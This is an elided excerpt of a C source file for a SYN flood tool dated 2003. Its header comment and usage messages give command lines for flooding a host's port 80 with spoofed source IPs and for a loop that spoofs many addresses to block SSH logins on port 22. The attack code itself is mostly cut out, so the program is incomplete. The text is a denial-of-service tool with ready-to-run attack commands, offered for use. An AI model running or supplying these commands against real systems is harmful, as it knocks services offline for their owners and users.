/* Copyright GPL 2003 by Mike Chirico <mchirico@users.sourceforge.net>
  ...
  How to use this program.
   ...
   on port 80.
     ...
     $./syn_flood -s 192.168.1.155 -d 192.168.1.71 -n 2000000 -p 80 
 ...
 works against port 22. You will not be able to login.
     ...
     do                                                             
      for i in `seq 256`                                            
      do                                                            
       ./syn_flood -s "192.168.$j.$i" -d 192.168.1.71 -p 22 -n 1   
      done                                                          
     done                                              
  ...
  If you want to set the SackOK
    ...
    $ ./syn_flood -s 192.168.1.81 -d 192.168.1.71 -p 80 -n 1 -w 4 -x 2

  Or if you want to set SackOK and mss to 1460

    $ ./syn_flood -s 192.168.1.81 -d 192.168.1.71 -p 80 -n 1 -w 4 -x 2 -y 2 -z 4 -g 5 -h 180
...
main (int argc, char **argv)
{
  ...
  {
    fprintf (stderr,
	     "\nsyn_flood -s <source ip> -d <destination ip> -p <port> -n <number of SYN floods>\n");
    fprintf (stderr, "\nYou must give me a destination\n");
    fprintf (stderr,
	     "  Example:\n\t\t./syn_flood -s 192.168.1.81 -d 192.168.1.71 -p 80 -n 1\n");
    fprintf (stderr,
	     "  Or with SackOK :\n\t\t./syn_flood -s 192.168.1.81 -d 192.168.1.71 -p 80 -n 1 -w 4 -x 2\n");
    fprintf (stderr,
	     "  SackOK and mss 1460:\n\t\t./syn_flood -s 192.168.1.81 -d 192.168.1.71 -p 80 -n 1 -w 4 -x 2 -y 2 -z 4 -g 5 -h 180\n");
  ...
  {
    fprintf (stderr,
	     "\n Also, you must be root to run this program:  ./su -c \"./syn_flood -s <source ip> -d <destination ip> -p 80 -n 2000\"\n");
    return 1;
  }
